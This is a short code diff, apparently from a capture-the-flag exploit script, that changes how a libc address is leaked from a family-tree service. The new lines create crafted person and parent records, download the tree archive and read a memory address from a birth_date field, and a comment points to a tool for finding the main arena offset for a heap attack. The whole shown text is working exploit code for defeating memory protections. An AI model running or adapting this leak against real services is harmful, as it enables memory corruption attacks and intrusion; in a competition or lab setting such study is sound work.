@@ -28,11 +28,13 @@ async def get_libc_address(endpoint: str):
         await client.login(login, password)
         await client.create_tree("title", "description")
 
-        await client.update_links([(0, "any")])
+        parent_id = await client.create_person("", 0, 0, None, None)
+        person_id = await client.create_person("", 0, 0, parent_id, None)
+        await client.update_tree("title", "description", person_id)
 
         archive = await client.download_tree_archive()
         parsed_archive = await client.check_tree_archive(archive)
-        leaked_address = parsed_archive["tree"]["links"][0]["type"]
+        leaked_address = parsed_archive["tree"]["person"]["parents"][0]["birth_date"]
         print("Leaked address:", hex(leaked_address))
 
     # Main Arena offset can be obtained with https://github.com/bash-c/main_arena_offset
